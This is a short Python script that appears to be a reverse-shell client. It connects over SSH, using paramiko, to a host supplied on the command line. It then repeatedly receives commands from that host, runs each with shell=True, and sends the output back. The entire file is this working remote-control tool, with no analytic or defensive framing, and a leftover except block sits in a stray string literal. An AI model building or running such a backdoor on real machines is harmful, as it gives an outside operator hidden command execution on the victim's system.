import os
import subprocess
import socket
import paramiko
import sys
from auth_funcs import key_trust,manual_auth,auto_auth

def handle_client(user,host,port):
    client_sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        client_sock.connect((host,port))
        print("[+] Connected to {}:{}".format(client_sock.getpeername()[0],client_sock.getpeername()[1]))
    except Exception as e:
        print("[-] Failed to connect to remote host: {}".format(str(e)))
        sys.exit(1)
    client_t = paramiko.Transport(client_sock)
    client_t.start_client()
    key_trust(client_t,host)
    auth_ok = auto_auth(client_t,user)
    if not auth_ok:
        manual_auth(client_t,user)
    session = client_t.open_session()
    if client_t.is_authenticated and session.active:
        session.send('ClientConnected')
        print(session.recv(4096).decode())
    while True and session.active and client_t.is_authenticated:
        cmd = session.recv(4096)
        print(cmd.decode())
        cmd = cmd.decode()
        cmd = cmd.strip()
        try:
            if '\n' in cmd:
                cmd = cmd.strip('\n')
            out = subprocess.check_output(cmd,stderr = subprocess.STDOUT,shell=True)
            if not len(out):
                out = "Command returned"
            session.send(out)
        except subprocess.SubprocessError:
            session.send(b'')
"""
        except Exception as e:
            print(f"Got error {str(e)}")
            sys.exit(1)
        except KeyboardInterrupt:
            print("Ok bye!")
"""
if __name__ == '__main__':
    if len(sys.argv) < 3:
        print(f"Usage {sys.argv[0]} <user> <host> <port>") 
        sys.exit(1)
    user = sys.argv[1]
    host = sys.argv[2]
    port = 22
    if len(sys.argv) == 4:
        port = int(sys.argv[3])
    handle_client(user,host,port)
